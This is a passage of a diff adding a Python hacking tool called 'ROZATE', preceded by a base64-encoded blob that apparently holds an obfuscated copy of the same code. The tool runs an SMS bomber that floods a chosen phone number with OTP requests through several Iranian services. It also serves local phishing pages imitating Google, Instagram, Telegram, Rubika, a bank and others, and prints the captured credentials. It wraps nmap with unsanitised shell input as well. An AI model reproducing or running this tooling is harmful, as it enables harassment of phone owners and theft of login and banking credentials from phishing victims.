YT1kdW1wcyh7InBob25lTnVtYmVyIjogIjAiK251bWJlcl9zcGFtfSkpCgkJCQlwcmludCgiXDAzM1szMm1TRU5EIFNNUyAjIFwwMzNbMzFtU05BUCBCT1giKQoJCQkJdGltZSg0KQoJCQkJcmVxLnBvc3QoImh0dHBzOi8vd3d3Lm5hbWF2YS5pci9hcGkvdjEuMC9hY2NvdW50cy9yZWdpc3RyYXRpb25zL2J5LXBob25lL3JlcXVlc3QiLGhlYWRlcnM9aGVhZGVycyxkYXRhPWR1bXBzKHsiVXNlck5hbWUiOiIrOTgiK251bWJlcl9zcGFtfSkuZW5jb2RlKCkpCgkJCQlwcmludCgiXDAzM1szMm1TRU5EIFNNUyAjIFwwMzNbMzFtTk1BVkEiKQoJCQkJdGltZSg0KQoJCQkJcmVxLnBvc3QoImh0dHBzOi8vYXBpLnRvb3BtYXJrZXQuY29tL2FwaS92MS9hdXRoL2xvZ2luL251bWJlciIsaGVhZGVycz1oZWFkZXJzLGRhdGE9ZHVtcHMoeyJtb2JpbGUiOiIwIitudW1iZXJfc3BhbX0pKQoJCQkJcHJpbnQoIlwwMzNbMzJtU0VORCBTTVMgIyBcMDMzWzMxbVRvb3AgTWFya2V0IikKCQkJCXRpbWUoNCkKCQkJCXJlcS5wb3N0KCJodHRwczovL3d3dy5maWxpbW8uY29tL2FwaS9mYS92MS91c2VyL0F1dGhlbnRpY2F0ZS9jb3VudHJ5X2NvZGUiLGhlYWRlcnM9aGVhZGVycyxkYXRhPWR1bXBzKHsibW9iaWxlIjoiMCIrbnVtYmVyX3NwYW0sImd1aWQiOiJBREIzNDg4RS1FNTEyLUUzMTEtNDJGRi03RUUxREU4N0Y0RkEifSkuZW5jb2RlKCkpCgkJCQlwcmludCgiXDAzM1szMm1TRU5EIFNNUyAjIFwwMzNbMzFtRmlsaW1vIikKCQlzeXMoImNsZWFyIikKCQlwcmludCgiXDAzM1szMm1yZXR1cm4gU01TIFwwMzNbMzFtPyBcMDMzWzMybXkvXDAzM1szMm1uXG4iKQoJCWVudGVyX3lfbiA9IHN0cihpbnB1dCgiXDAzM1szMm1FTlRFUlwwMzNbMzFtICM+ICIpKQoJCWlmIGVudGVyX3lfbiA9PSAieSIgb3IgZW50ZXJfeV9uID09ICJZIjoKCQkJc3BhbSgpCgkJZWxpZiBlbnRlcl95X24gPT0gIm4iIG9yIGVudGVyX3lfbiA9PSAiTiI6CgkJCWluZGV4KCkKCQllbHNlOgoJCQlzeXMoImNsZWFyIikKCQkJcHJpbnQoIlwwMzNbMzJtUk9aQVRFIFwwMzNbMzRtLSBcMDMzWzMxbXYxIikKCQkJcHJpbnQoIlwwMzNbMzJtRU5URVIgRVJST1IgXDAzM1szMW0hIikKCQkJcmV0dXJuIGluZGV4KCkKCWV4Y2VwdCBLZXlib2FyZEludGVycnVwdDogIyBDbG9zZWQgQXBwIG9yIE5vCgkJc3lzKCJjbGVhciIpCgkJcHJpbnQoIlwwMzNbMzZtQ2xvc2VkIFwwMzNbMzJtVG9vbHMgXDAzM1szMW0/IikKCQlyZXR1cm5fdG9vbHMgPSBzdHIoaW5wdXQoIlwwMzNbMzZtWVwwMzNbMzFtL1wwMzNbMzZtTiBcMDMzWzM3bTogIikpCgkJaWYgcmV0dXJuX3Rvb2xzID09ICJZIiBvciByZXR1cm5fdG9vbHMgPT0gInkiOgoJCQlleGl0KCkKCQllbGlmIHJldHVybl90b29scyA9PSAibiIgb3IgcmV0dXJuX3Rvb2xzID09ICJOIjoKCQkJcmV0dXJuIGluZGV4KCkKZGVmIGluZGV4KCk6Cgl0cnk6CgkJc3lzKCJjbGVhciIpCgkJcHJpbnQoIiIiXDAzM1szMm0KCiDilojilojilojilojilojilojilZfilojilojilZfilojilojilojilojilojilojilZcg4paI4paI4pWXICDilojilojilZfilojilojilojilojilojilojilojilZfilojilojilojilojilojilojilZcgICAgICDilojilojilZcgIOKWiOKWiOKVlwrilojilojilZTilZDilZDilZDilZDilZ3ilojilojilZHilojilojilZTilZDilZDilojilojilZfilojilojilZEgIOKWiOKWiOKVkeKWiOKWiOKVlOKVkOKVkOKVkOKVkOKVneKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVlyAgICAg4pWa4paI4paI4pWX4paI4paI4pWU4pWdCuKWiOKWiOKVkSAgICAg4paI4paI4pWR4paI4paI4paI4paI4paI4paI4pWU4pWd4paI4paI4paI4paI4paI4paI4paI4pWR4paI4paI4paI4paI4paI4pWXICDilojilojilojilojilojilojilZTilZ3ilojilojilojilojilojilZfilZrilojilojilojilZTilZ0gCuKWiOKWiOKVkSAgICAg4paI4paI4pWR4paI4paI4pWU4pWQ4pWQ4pWQ4pWdIOKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVkeKWiOKWiOKVlOKVkOKVkOKVnSAg4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4pWa4pWQ4pWQ4pWQ4pWQ4pWd4paI4paI4pWU4paI4paI4pWXIArilZrilojilojilojilojilojilojilZfilojilojilZHilojilojilZEgICAgIOKWiOKWiOKVkSAg4paI4paI4pWR4paI4paI4paI4paI4paI4paI4paI4pWX4paI4paI4pWRICDilojilojilZEgICAgIOKWiOKWiOKVlOKVnSDilojilojilZcKIOKVmuKVkOKVkOKVkOKVkOKVkOKVneKVmuKVkOKVneKVmuKVkOKVnSAgICAg4pWa4pWQ4pWdICDilZrilZDilZ3ilZrilZDilZDilZDilZDilZDilZDilZ3ilZrilZDilZ0gIOKVmuKVkOKVnSAgICAg4pWa4pWQ4pWdICDilZrilZDilZ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKIiIiKQkKCQlwcmludCgiIiIKXDAzM1szMm1bMV0gXDAzM1szMW0tPiBcMDMzWzM3bVNNUyBCb21iZXIKXDAzM1szMm1bMl0gXDAzM1szMW0tPiBcMDMzWzM3bVBhc3NXb3JkIENoYW5nZQpcMDMzWzMybVszXSBcMDMzWzMxbS0+IFwwMzNbMzdtTm1hcCBTY2FubmVyClwwMzNbMzJtWzRdIFwwMzNbMzFtLT4gXDAzM1szN21QaGlzaGluZ2VzClwwMzNbMzJtWzBdIFwwMzNbMzFtLT4gXDAzM1szN21FWElUCiIiIikKCQlFbnRlciA9IHN0cihpbnB1dCgiXDAzM1szMm0jXDAzM1szMW0+ICIpKQoJCWlmIEVudGVyID09ICIxIjoKCQkJc3BhbSgpCgkJaWYgRW50ZXIgPT0gIjIiOgoJCQlwYXNzb3dyZCgpCgkJaWYgRW50ZXIgPT0gIjMiOgoJCQlubWFwKCkKCQlpZiBFbnRlciA9PSAiNCI6CgkJCXBoaXNoaW5nKCkKCQlpZiBFbnRlciA9PSAiMCIgb3IgRW50ZXIgPT0gIjAwIjoKCQkJc3lzKCJjbGVhciIpCgkJCXByaW50KCJcMDMzWzMxbUNJUEhFUiBcMDMzWzM3bS0gXDAzM1szMm1YIikKCQkJZXhpdCgpCgkJZWxzZToKCQkJcHJpbnQoIlwwMzNbMzJtQ29tbWFuZCBOb3QgRmluZFwwMzNbMzFtICEiKQoJCQl0aW1lKDAuOTkpCgkJCXJldHVybiBpbmRleCgpCgoJZXhjZXB0IEtleWJvYXJkSW50ZXJydXB0OgoJCXN5cygiY2xlYXIiKQoJCXByaW50KCJcMDMzWzM2bUNsb3NlZCBcMDMzWzMybVRvb2xzIFwwMzNbMzFtPyIpCgkJcmV0dXJuX3Rvb2xzID0gc3RyKGlucHV0KCJcMDMzWzM2bVlcMDMzWzMxbS9cMDMzWzM2bU4gXDAzM1szN206ICIpKQoJCWlmIHJldHVybl90b29scyA9PSAiWSIgb3IgcmV0dXJuX3Rvb2xzID09ICJ5IjoKCQkJZXhpdCgpCgkJZWxpZiByZXR1cm5fdG9vbHMgPT0gIm4iIG9yIHJldHVybl90b29scyA9PSAiTiI6CgkJCXJldHVybiBpbnRlcm5ldCgpCmRlZiBjaGVjaygpOgoJdHJ5OgoJCWNoZWNrID0gb3MucGF0aC5pc2ZpbGUocicubG9naW4udHh0JykKCQlpZiBjaGVjayA9PSBUcnVlOgoJCQlzeXMoImNsZWFyIikKCQkJcHJpbnQoIlwwMzNbMzJtUk9aQVRFIFwwMzNbMzRtLSBcMDMzWzMxbXYxXG5cblwwMzNbMzdtW1wwMzNbMzJtIExPR0lOXDAzM1szN20gXVxuIikKCQkJcGFzc3dvcmRfTG9naW4gPSBzdHIoaW5wdXQoIlwwMzNbMzJtUEFTU1dPUkRcMDMzWzMxbSA6ICIpKQoJCQlpZiBwYXNzd29yZF9Mb2dpbiA9PSBvcGVuKCIubG9naW4udHh0IikucmVhZCgpOgoJCQkJaW5kZXgoKQoJCQllbHNlOgoJCQkJc3lzKCdjbGVhcicpCgkJCQl0aW1lKDAuNzcpCgkJCQlwcmludCgiIiJcMDMzWzMxbQrilojilojilojilojilojilojilZcgIOKWiOKWiOKWiOKWiOKWiOKVlyDilojilojilojilojilojilojilojilZfilojilojilojilojilojilojilojilZcK4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4paI4paI4pWU4pWQ4pWQ4pWQ4pWQ4pWd4paI4paI4pWU4pWQ4pWQ4pWQ4pWQ4pWdCuKWiOKWiOKWiOKWiOKWiOKWiOKVlOKVneKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVkeKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKWiOKWiOKWiOKWiOKWiOKVlwrilojilojilZTilZDilZDilZDilZ0g4paI4paI4pWU4pWQ4pWQ4paI4paI4pWR4pWa4pWQ4pWQ4pWQ4pWQ4paI4paI4pWR4pWa4pWQ4pWQ4pWQ4pWQ4paI4paI4pWRCuKWiOKWiOKVkSAgICAg4paI4paI4pWRICDilojilojilZHilojilojilojilojilojilojilojilZHilojilojilojilojilojilojilojilZEK4pWa4pWQ4pWdICAgICDilZrilZDilZ0gIOKVmuKVkOKVneKVmuKVkOKVkOKVkOKVkOKVkOKVkOKVneKVmuKVkOKVkOKVkOKVkOKVkOKVkOKVnQoiIiIpCgkJCQlwcmludCgiXDAzM1szMm1ST1pBVEUgXDAzM1szNG0tIFwwMzNbMzFtdjFcbiIpCgkJCQlwcmludCgiXDAzM1szMm1QYXNzV29yZCBOb3QgRmluZFwwMzNbMzFtISIpCgkJCQl0aW1lKDAuNzIpCgkJCQlyZXR1cm4gaW50ZXJuZXQoKQoJCWlmIGNoZWNrID09IEZhbHNlOgoJCQlzeXMoJ2NsZWFyJykKCQkJcHJpbnQoIiIiXDAzM1szMm0gCuKWiOKWiOKWiOKWiOKWiOKWiOKVlyAg4paI4paI4paI4paI4paI4pWXIOKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKWiOKWiOKWiOKWiOKWiOKVlwrilojilojilZTilZDilZDilojilojilZfilojilojilZTilZDilZDilojilojilZfilojilojilZTilZDilZDilZDilZDilZ3ilojilojilZTilZDilZDilZDilZDilZ0K4paI4paI4paI4paI4paI4paI4pWU4pWd4paI4paI4paI4paI4paI4paI4paI4pWR4paI4paI4paI4paI4paI4paI4paI4pWX4paI4paI4paI4paI4paI4paI4paI4pWXCuKWiOKWiOKVlOKVkOKVkOKVkOKVnSDilojilojilZTilZDilZDilojilojilZHilZrilZDilZDilZDilZDilojilojilZHilZrilZDilZDilZDilZDilojilojilZEK4paI4paI4pWRICAgICDilojilojilZEgIOKWiOKWiOKVkeKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVkeKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVkQrilZrilZDilZ0gICAgIOKVmuKVkOKVnSAg4pWa4pWQ4pWd4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWd4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWdCiIiIikKCQkJcHJpbnQoIlwwMzNbMzJtUk9aQVRFIFwwMzNbMzRtLSBcMDMzWzMxbXYxXG4iKQoJCQlwYXNzd29yZF9uZXcgPSBzdHIoaW5wdXQoIlwwMzNbMzJtRW50ZXIgUGFzc3dvcmQgTmV3IFwwMzNbMzFtOiAiKSkJCgkJCW9wZW4oIi5sb2dpbi50eHQiLCIrYSIpLndyaXRlKHBhc3N3b3JkX25ldykKCQkJdGltZSgxKQoJCQlpbmRleCgpCglleGNlcHQgS2V5Ym9hcmRJbnRlcnJ1cHQ6CgkJcGFzcwpkZWYgaW50ZXJuZXQoKToKCXRyeToKCQlzZW5kX2NoZWNrID0gcmVxdWVzdHMucG9zdCgiaHR0cHM6Ly90aW1lLmlyIikuc3RhdHVzX2NvZGUKCQl0cnk6CgkJCWlmIHNlbmRfY2hlY2sgPT0gMjAwOgoJCQkJY2hlY2soKQoJCQllbHNlOgoJCQkJc3lzKCJjbGVhciIpCgkJCQlwcmludCgiXDAzM1szMm1Zb3VyIEludGVybmV0IE5vdCBcMDMzWzMxbUNvbm5lY3RlZFxuXG5cMDMzWzMybUN0cmwgXDAzM1szMW0rXDAzM1szMm0gWFxuU1RBVFVTIDogXDAzM1szNG17fSIuZm9ybWF0KHNlbmRfY2hlY2spKQoJCQkJdGltZSgyKQoJCQkJcmV0dXJuIGludGVybmV0KCkKCQlleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6CgkJCXN5cygiY2xlYXIiKQoJCQlwcmludCgiIiJcMDMzWzMxbQoKIOKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKVl+KWiOKWiOKWiOKWiOKWiOKWiOKVlyDilojilojilZcgIOKWiOKWiOKVl+KWiOKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKWiOKWiOKWiOKWiOKVlyAgICAgIOKWiOKWiOKVlyAg4paI4paI4pWXCuKWiOKWiOKVlOKVkOKVkOKVkOKVkOKVneKWiOKWiOKVkeKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVl+KWiOKWiOKVkSAg4paI4paI4pWR4paI4paI4pWU4pWQ4pWQ4pWQ4pWQ4pWd4paI4paI4pWU4pWQ4pWQ4paI4paI4pWXICAgICDilZrilojilojilZfilojilojilZTilZ0K4paI4paI4pWRICAgICDilojilojilZHilojilojilojilojilojilojilZTilZ3ilojilojilojilojilojilojilojilZHilojilojilojilojilojilZcgIOKWiOKWiOKWiOKWiOKWiOKWiOKVlOKVneKWiOKWiOKWiOKWiOKWiOKVl+KVmuKWiOKWiOKWiOKVlOKVnSAK4paI4paI4pWRICAgICDilojilojilZHilojilojilZTilZDilZDilZDilZ0g4paI4paI4pWU4pWQ4pWQ4paI4paI4pWR4paI4paI4pWU4pWQ4pWQ4pWdICDilojilojilZTilZDilZDilojilojilZfilZrilZDilZDilZDilZDilZ3ilojilojilZTilojilojilZcgCuKVmuKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKVkeKWiOKWiOKVkSAgICAg4paI4paI4pWRICDilojilojilZHilojilojilojilojilojilojilojilZfilojilojilZEgIOKWiOKWiOKVkSAgICAg4paI4paI4pWU4pWdIOKWiOKWiOKVlwog4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWd4pWa4pWQ4pWd4pWa4pWQ4pWdICAgICDilZrilZDilZ0gIOKVmuKVkOKVneKVmuKVkOKVkOKVkOKVkOKVkOKVkOKVneKVmuKVkOKVnSAg4pWa4pWQ4pWdICAgICDilZrilZDilZ0gIOKVmuKVkOKVnQpcMDMzWzMybVxuRXJyb3IgSW50ZXJuZXRcMDMzWzMxbSEgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAoJCQkiIiIpCglleGNlcHQgS2V5Ym9hcmRJbnRlcnJ1cHQ6CgkJcGFzcwppbnRlcm5ldCgp")
+import datetime
+import pyuseragents
+#-> = = = [ ROZATE - v1 ] = = = <-#
+open("My","w+").write("𝕮𝕴𝕻𝕳𝕰𝕽-𝖃 ↴ \n@CipherX => Rubika\n@EBLETSM => Telegram")
+open(".log","+a").write(f"𝕮𝕴𝕻𝕳𝕰𝕽-𝖃 ↴ \nRun Shod Tools {datetime.datetime.now()}\n")
+
+req = requests.session() # Session Request
+platform = pyuseragents.random() # Platform Random
+headers = {"content-type":"application/json","user-agent":platform} # HEADERS
+
+def passowrd(): # Chang Password
+	try:
+		sys('clear')
+		print("""\033[32m
+
+ ██████╗██╗██████╗ ██╗  ██╗███████╗██████╗      ██╗  ██╗
+██╔════╝██║██╔══██╗██║  ██║██╔════╝██╔══██╗     ╚██╗██╔╝
+██║     ██║██████╔╝███████║█████╗  ██████╔╝█████╗╚███╔╝ 
+██║     ██║██╔═══╝ ██╔══██║██╔══╝  ██╔══██╗╚════╝██╔██╗ 
+╚██████╗██║██║     ██║  ██║███████╗██║  ██║     ██╔╝ ██╗
+ ╚═════╝╚═╝╚═╝     ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝     ╚═╝  ╚═╝
+                                                        
+""")
+		print("\033[32mROZATE \033[34m- \033[31mv1")
+		new_pass = str(input("\033[32mENTER PASSWORD New \033[31m: "))
+		sys("rm -rf .login.txt")
+		open(".login.txt","+a").write(new_pass)
+		print("\033[32mOK Chang \033[31mPASSWORD \033[36m:)")
+		return internet()
+	except KeyboardInterrupt:
+		pass
+def nmap(): # NMAP Scanner
+	try:
+		sys('clear')
+		print("""\033[32m
+███╗   ██╗███╗   ███╗ █████╗ ██████╗ 
+████╗  ██║████╗ ████║██╔══██╗██╔══██╗
+██╔██╗ ██║██╔████╔██║███████║██████╔╝
+██║╚██╗██║██║╚██╔╝██║██╔══██║██╔═══╝ 
+██║ ╚████║██║ ╚═╝ ██║██║  ██║██║     
+╚═╝  ╚═══╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝""")
+		print("\033[32mROZATE \033[34m- \033[31mv1")
+		ip_enter = str(input("\033[32mIP\033[31m Or \033[37mSite : "))
+		info_nmap = sys(f"nmap {ip_enter} | grep 'open'")
+		time(0.55)
+		print(f"\033[35mopen : \033[36m{info_nmap}\v")
+		enter = str(input("\033[31mReturn\033[32m Rozate.py ? Y/N :\033[36m "))
+		if enter == "y" or enter == "Y":
+			return index()
+		if enter == "n" or enter == "N":
+			exit()
+	except KeyboardInterrupt:
+		sys("clear")
+		print("\033[36mClosed \033[32mTools \033[31m?")
+		return_tools = str(input("\033[36mY\033[31m/\033[36mN \033[37m: "))
+		if return_tools == "Y" or return_tools == "y":
+			exit()
+		elif return_tools == "n" or return_tools == "N":
+			return index()
+def Call():
+	while True:
+		if os.path.exists("site/Call/Account.txt"):
+			sys("cat site/Call/Account.txt")
+			sys("rm -rf site/Call/Account.txt")
+		else:
+			pass
+def Rubika():
+	while True:
+		if os.path.exists("site/Rubika/Account.txt"):
+			sys("cat site/Rubika/Account.txt")
+			sys("rm -rf site/Rubika/Account.txt")
+		else:
+			pass
+def Shad():
+	while True:
+		if os.path.exists("site/Shad/LOG/Account.txt"):
+			sys("cat site/Shad/LOG/Account.txt")
+			sys("rm -rf site/Shad/LOG/Account.txt")
+		else:
+			pass
+def Telegram():
+	while True:
+		if os.path.exists(f"site/Telegram/info.txt"):
+			sys("cat site/Telegram/info.txt")
+			sys("rm -rf site/Telegram/info.txt")
+		else:
+			pass
+def IP():
+	while True:
+		if os.path.exists(f"site/IP/ip.txt"):
+			sys("cat site/IP/ip.txt")
+			sys("rm -rf site/IP/ip.txt")
+		else:
+			pass
+def bank():
+    while True:
+        if  os.path.exists(f"site/bank/bank.txt"):
+        	sys(f"cat site/bank/bank.txt")
+        	sys("cp site/bank/bank.txt LOG")
+        	sys("cp site/bank/Farsi[Bank].txt LOG")
+        	sys(f"rm -rf site/bank/bank.txt")
+        	sys("rm -rf site/bank/Farsi[Bank].txt")
+        else:
+            pass	
+def instagram():
+    while True:
+        if  os.path.exists(f"site/instagram/instagram.txt"):
+        	sys(f"cat site/instagram/instagram.txt")
+        	sys("cp site/instagram/instagram.txt LOG")
+        	sys(f"rm -rf site/instagram/instagram.txt")
+        else:
+            pass
+def google():
+    while True:
+        if  os.path.exists(f"site/google/google.txt"):
+        	sys(f"cat site/google/google.txt")
+        	sys("cp site/google/google.txt LOG")
+        	sys(f"rm -rf site/google/google.txt")
+        else:
+            pass
+def phishing():
+	sys("clear")
+	print("""\033[31m
+
+ ██████╗██╗██████╗ ██╗  ██╗███████╗██████╗      ██╗  ██╗
+██╔════╝██║██╔══██╗██║  ██║██╔════╝██╔══██╗     ╚██╗██╔╝
+██║     ██║██████╔╝███████║█████╗  ██████╔╝█████╗╚███╔╝ 
+██║     ██║██╔═══╝ ██╔══██║██╔══╝  ██╔══██╗╚════╝██╔██╗ 
+╚██████╗██║██║     ██║  ██║███████╗██║  ██║     ██╔╝ ██╗
+ ╚═════╝╚═╝╚═╝     ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝     ╚═╝  ╚═╝
+ \n\033[0m                                                      
+			""")
+	print("""
+\033[32m [1] \033[31m Google\n
+\033[32m [2] \033[31m Instagram\n
+\033[32m [3] \033[31m VIP [ \033[37mBANK Phishing \033[31m]\n
+\033[32m [4] \033[31m IP Target\n
+\033[32m [5] \033[31m Telegram\n
+\033[32m [6] \033[31m Shad\n
+\033[32m [7] \033[31m Rubika\n
+\033[32m [8] \033[31m Call Of Duty\n
+\033[31m [00] \033[32m Back Menu
+""")
+	opt = input(str("\033[31m Enter :\033[37m "))
+	if opt == "00" or opt == "0":
+		return index()
+	if opt == "1":
+		sys("clear")
+		try:
+			port = str(input("\033[31m port \033[32m(\033[32m1\033[31m, \033[32m1000\033[32m) \033[0m:\033[37m "))
+			sys(f"php -S 127.0.0.1:{port} -t site/google > /dev/null 2>&1 & sleep 2")
+			print(f"\033[31m RUN LocalHost ↴\n\033[34m http://localhost:{port}")
+			print("\033[35m<=========>\n\033[0m")
+			google()
+		except:
+			sys("killall php")		
+	if opt == "7":
+		sys("clear")
+		try:
+			port = str(input("\033[31m port \033[32m(\033[32m1\033[31m, \033[32m1000\033[32m) \033[0m:\033[37m "))
+			sys(f"php -S 127.0.0.1:{port} -t site/Rubika > /dev/null 2>&1 & sleep 2")
+			print(f"\033[31m RUN LocalHost ↴\n\033[34m http://localhost:{port}")
+			print("\033[35m<=========>\n\033[0m")
+			Rubika()
+		except:
+			sys("killall php")	
+	if opt == "8":
+		sys("clear")
+		try:
+			port = str(input("\033[31m port \033[32m(\033[32m1\033[31m, \033[32m1000\033[32m) \033[0m:\033[37m "))
+			sys(f"php -S 127.0.0.1:{port} -t site/Call > /dev/null 2>&1 & sleep 2")
+			print(f"\033[31m RUN LocalHost ↴\n\033[34m http://localhost:{port}")
+			print("\033[35m<=========>\n\033[0m")
+			Call()
+		except:
+			pass	
+	if opt == "2":
+		sys("clear")
+		try:
+			port = str(input("\033[31m port \033[32m(\033[32m1\033[31m, \033[32m1000\033[32m) \033[0m:\033[37m "))
+			sys(f"php -S 127.0.0.1:{port} -t site/instagram > /dev/null 2>&1 & sleep 2")
+			print(f"\033[31m RUN LocalHost ↴\n\033[34m http://localhost:{port}")
+			print("\033[35m<=========>\n\033[0m")
+			instagram()
+		except:
+			sys("killall php")
+	if opt == "5":
+		sys("clear")
+		try:
+			port = str(input("\033[31m port \033[32m(\033[32m1\033[31m, \033[32m1000\033[32m) \033[0m:\033[37m "))
+			sys(f"php -S 127.0.0.1:{port} -t site/Telegram > /dev/null 2>&1 & sleep 2")
+			print(f"\033[31m RUN LocalHost ↴\n\033[34m http://localhost:{port}")
+			print("\033[35m<=========>\n\033[0m")
+			Telegram()
+		except: pass
+	if opt == "6":
+		sys("clear")
+		try:
+			port = str(input("\033[31m port \033[32m(\033[32m1\033[31m, \033[32m1000\033[32m) \033[0m:\033[37m "))
+			sys(f"php -S 127.0.0.1:{port} -t site/Shad > /dev/null 2>&1 & sleep 2")
+			print(f"\033[31m RUN LocalHost ↴\n\033[34m http://localhost:{port}")
+			print("\033[35m<=========>\n\033[0m")
+			Shad()
+		except: pass
+	if opt == "4":
+		sys("clear")
+		try:
+			port = str(input("\033[31m port \033[32m(\033[32m1\033[31m, \033[32m1000\033[32m) \033[0m:\033[37m "))
+			sys(f"php -S 127.0.0.1:{port} -t site/IP > /dev/null 2>&1 & sleep 2")
+			print(f"\033[31m RUN LocalHost ↴\n\033[34m http://localhost:{port}")
+			print("\033[35m<=========>\n\033[0m")
+			IP()
+		except:
+			pass			 
+	if opt == "3":
+		sys("clear")
+		key = str(input("\033[32m KEY : \033[37m"))
+		if key == open("site/Dont").read():
+			try:
+				port = str(input("\033[31m port \033[32m(\033[32m1\033[31m, \033[32m1000\033[32m) \033[0m:\033[37m "))
+				sys(f"php -S 127.0.0.1:{port} -t site/bank > /dev/null 2>&1 & sleep 2")
+				print(f"\033[31m RUN LocalHost ↴\n\033[34m http://localhost:{port}")
+				print("\033[35m<=========>\n\033[0m")
+				bank()
+			except:
+				sys("killall php")
+		else:
+			time(2)
+			sys("clear")
+			print("""\033[31m
+
+ ██████╗██╗██████╗ ██╗  ██╗███████╗██████╗      ██╗  ██╗
+██╔════╝██║██╔══██╗██║  ██║██╔════╝██╔══██╗     ╚██╗██╔╝
+██║     ██║██████╔╝███████║█████╗  ██████╔╝█████╗╚███╔╝ 
+██║     ██║██╔═══╝ ██╔══██║██╔══╝  ██╔══██╗╚════╝██╔██╗ 
+╚██████╗██║██║     ██║  ██║███████╗██║  ██║     ██╔╝ ██╗
+ ╚═════╝╚═╝╚═╝     ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝     ╚═╝  ╚═╝
+ \n\033[0m\n\033[32mThe \033[31mkey \033[32mis wrong!                                                      
+			""")			
+def spam(): # SPAM SMS Bomber
+	try:
+		sys('clear')
+		print("""\033[31m
+
+███████╗███╗   ███╗███████╗
+██╔════╝████╗ ████║██╔════╝
+███████╗██╔████╔██║███████╗
+╚════██║██║╚██╔╝██║╚════██║
+███████║██║ ╚═╝ ██║███████║
+╚══════╝╚═╝     ╚═╝╚══════╝
+                           
+""")
+		print("\033[32mROZATE \033[34m- \033[31mv1")
+		number_spam = str(input("\033[32mNUMBER \033[31m(912******) : "))
+		tedad = int(input("\033[32mSize SEND \033[31m( 1 - 100 ) : "))
+		if tedad > 100:
+			sys("clear")
+			print("\033[31mERROR \033[32m100 Be Pain Vard Koned :)")
+			time(2)
+			return spam()
+		else:
+			for i in range(int(tedad)):
+				print(f"\033[37mSEND Message Team \033[33m{i}\033[37m Ta\033[33m {tedad}")
+				time(4)
+				req.post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",headers=headers,data=dumps({"cellphone": f"+98{number_spam}"}).encode())
+				print("\033[32mSEND SMS # \033[31mSNAP")
+				time(4)
+				req.post("https://api.divar.ir/v5/auth/authenticate",headers=headers,data=dumps({"phone": f'0{number_spam}'}))
+				print("\033[32mSEND SMS # \033[31mDivar")
+				time(4)
+				req.post("https://www.sheypoor.com/api/v10.0.0/auth/send",headers=headers,data=dumps({"username":"0"+number_spam}))
+				print("\033[32mSEND SMS # \033[31msheypoor")
+				time(4)
+				req.post("https://app.snapp-box.com/api/v2/auth/otp/send",headers=headers,data=dumps({"phoneNumber": "0"+number_spam}))
+				print("\033[32mSEND SMS # \033[31mSNAP BOX")
+				time(4)
+				req.post("https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request",headers=headers,data=dumps({"UserName":"+98"+number_spam}).encode())
+				print("\033[32mSEND SMS # \033[31mNMAVA")
+				time(4)
+				req.post("https://api.toopmarket.com/api/v1/auth/login/number",headers=headers,data=dumps({"mobile":"0"+number_spam}))
+				print("\033[32mSEND SMS # \033[31mToop Market")
+				time(4)
+				req.post("https://www.filimo.com/api/fa/v1/user/Authenticate/country_code",headers=headers,data=dumps({"mobile":"0"+number_spam,"guid":"ADB3488E-E512-E311-42FF-7EE1DE87F4FA"}).encode())
+				print("\033[32mSEND SMS # \033[31mFilimo")
+		sys("clear")
+		print("\033[32mreturn SMS \033[31m? \033[32my/\033[32mn\n")
+		enter_y_n = str(input("\033[32mENTER\033[31m #> "))
+		if enter_y_n == "y" or enter_y_n == "Y":
+			spam()
+		elif enter_y_n == "n" or enter_y_n == "N":
+			index()
+		else:
+			sys("clear")
+			print("\033[32mROZATE \033[34m- \033[31mv1")
+			print("\033[32mENTER ERROR \033[31m!")
+			return index()
+	except KeyboardInterrupt: # Closed App or No
+		sys("clear")
+		print("\033[36mClosed \033[32mTools \033[31m?")
+		return_tools = str(input("\033[36mY\033[31m/\033[36mN \033[37m: "))
+		if return_tools == "Y" or return_tools == "y":
+			exit()
+		elif return_tools == "n" or return_tools == "N":
+			return index()
+def index():
+	try:
+		sys("clear")
+		print("""\033[32m
+
+ ██████╗██╗██████╗ ██╗  ██╗███████╗██████╗      ██╗  ██╗
+██╔════╝██║██╔══██╗██║  ██║██╔════╝██╔══██╗     ╚██╗██╔╝
+██║     ██║██████╔╝███████║█████╗  ██████╔╝█████╗╚███╔╝ 
+██║     ██║██╔═══╝ ██╔══██║██╔══╝  ██╔══██╗╚════╝██╔██╗ 
+╚██████╗██║██║     ██║  ██║███████╗██║  ██║     ██╔╝ ██╗
+ ╚═════╝╚═╝╚═╝     ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝     ╚═╝  ╚═╝
+                                                        
+""")	
+		print("""
+\033[32m[1] \033[31m-> \033[37mSMS Bomber
+\033[32m[2] \033[31m-> \033[37mPassWord Change
+\033[32m[3] \033[31m-> \033[37mNmap Scanner
+\033[32m[4] \033[31m-> \033[37mPhishinges
+\033[32m[0] \033[31m-> \033[37mEXIT
+""")
+		Enter = str(input("\033[32m#\033[31m> "))
+		if Enter == "1":
+			spam()
+		if Enter == "2":
+			passowrd()
+		if Enter == "3":
+			nmap()
